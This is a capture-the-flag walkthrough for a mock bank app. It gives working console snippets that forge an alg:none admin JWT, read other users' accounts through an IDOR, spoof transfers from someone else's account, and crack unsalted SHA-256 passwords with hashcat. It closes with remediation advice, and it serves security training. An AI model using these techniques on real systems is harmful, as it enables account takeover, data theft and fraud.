# Solution walkthrough (spoilers)

Stop here if you want to solve it yourself.

---

The goal is the developer console at **`/console/dev`**, which is gated
server-side on `role == "admin"`. Here is one full path to it, plus the side
quests.

## 1. Recon — find the hidden paths

Check `robots.txt`:

```
GET /robots.txt
```

It discloses two things a normal user shouldn't care about:

```
Disallow: /console/dev
Disallow: /api/_internal/
```

Visit `/console/dev` as a customer → **403, administrators only**. So the
gate is real; we need an admin session.

## 2. Read the client code

Open `/static/js/app.js`. Two useful facts:

- The session token is a JWT in `localStorage["mtb_token"]`, and `whoami()`
  just base64-decodes the payload — so the token is readable and its `role`
  claim is right there.
- A leftover developer note:

  ```
  TODO(dev): drop the alg:"none" shim from the token verifier before launch.
  ```

That's the way in.

## 3. Forge an admin token (alg:none)

Sign up, sign in, and grab your token from the browser console:

```js
Bank.whoami()          // { uid: 5, user: "you", role: "customer", ... }
```

The server's `verify_token()` accepts a token whose header says
`{"alg":"none"}` **without checking the signature**. Build one in the console:

```js
const b64 = o => btoa(JSON.stringify(o)).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
const header  = b64({ alg: "none", typ: "JWT" });
const payload = b64({ uid: 5, user: "you", role: "admin", iat: 0 });
Bank.setToken(header + "." + payload + ".");   // empty signature
```

Now navigate to `/console/dev` → you're in. It shows the flag and dumps the
whole user table, password hashes included.

You can hit the APIs directly too:

```js
await Bank.api('/api/_internal/flag', 'GET');
await Bank.api('/api/_internal/users', 'GET');
```

**Flag:** `FLAG{cl13nt_s1de_trust_1s_n0_trust_at_all}`

## 4. Side quest — IDOR in the account API

`/api/account/<id>` never checks that the account is yours. From any logged-in
session:

```js
for (let i = 1; i <= 5; i++) console.log(i, (await Bank.api('/api/account/'+i)).body);
```

You can read every customer's balance and transaction history.

## 5. Side quest — broken transfer authorization

`/api/transfer` trusts the `from` field in the request body. Nothing ties it
to your own account, so you can drain someone else's:

```js
await Bank.api('/api/transfer', 'POST', { from: 2, to: 5, amount: 87650 });
```

## 6. Bonus — crack the admin password

The user dump stores passwords as **unsalted SHA-256**. Take the `admin`
row's `pw_sha256` and crack it offline:

```bash
echo 'trustno1' | tr -d '\n' | sha256sum      # confirm the digest
# or with a wordlist:
hashcat -m 1400 admin_hash.txt rockyou.txt
john --format=raw-sha256 --wordlist=rockyou.txt admin_hash.txt
```

The seeded passwords (`trustno1`, `letmein2020`, `iloveyou`, `sunshine1`) are
all in common wordlists. Recover `trustno1` and sign in as the real `admin` —
no token forgery needed.

## Root causes / fixes

- **Never trust the client for authorization.** The role lives in a token the
  client holds; escalation is trivial. Roles must be looked up server-side
  from a trusted session.
- **Reject `alg:none`.** Pin the algorithm and always verify the signature.
- **Enforce object ownership** on every record lookup (fix the IDOR).
- **Derive the transfer source from the session**, not the request body.
- **Store passwords with a slow, salted KDF** (bcrypt/argon2), never bare
  SHA-256.
- **Don't ship internal paths / debug endpoints**, and don't leave hints in
  client code or `robots.txt`.
